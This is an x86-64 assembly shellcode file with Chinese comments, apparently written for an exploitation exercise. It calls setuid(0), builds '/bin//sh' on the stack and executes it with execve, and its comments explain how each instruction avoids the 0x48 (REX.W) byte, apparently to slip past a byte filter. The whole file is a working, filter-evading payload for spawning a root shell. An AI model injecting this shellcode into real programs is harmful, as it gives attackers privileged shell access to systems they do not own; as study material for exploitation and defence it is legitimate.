# no H no \x48, REX.W prefix
.global _start
_start:
.intel_syntax noprefix

    /* 0. 最高权限 (setuid(0)) */
    xor edi, edi        /* rdi = 0 (root UID)，生成 31 ff，完美避开 \x48 */
    push 105            /* 系统调用号 105 (0x69) 代表 setuid */
    pop rax             /* 生成 6a 69 58 */
    syscall

    /* 1. 准备 Null bytes 并分配栈空间 */
    xor esi, esi
    push rsi            /* 压入 8 字节的 0，作为字符串结尾的 Null terminator */
    push rsi            /* 再压入 8 字节，留给接下来写 /bin//sh */
    push rsp
    pop rdi             /* push rsp (0x54) + pop rdi (0x5f)，完美避开 mov rdi, rsp 的 0x48 */

    /* 2. 在栈上直接拼接 /bin//sh (利用 32 位寄存器避免 REX.W) */
    /* 0x6e69622f = "nib/" (小端序的反转), 0x68732f2f = "hs//" */
    mov dword ptr [rdi], 0x6e69622f
    mov dword ptr [rdi+4], 0x68732f2f

    /* 3. 设置 execve 的 syscall 号 */
    push 59
    pop rax             /* 避开 mov rax, 59 */

    /* 4. 清空 edx (envp) 并执行 syscall */
    xor edx, edx
    syscall
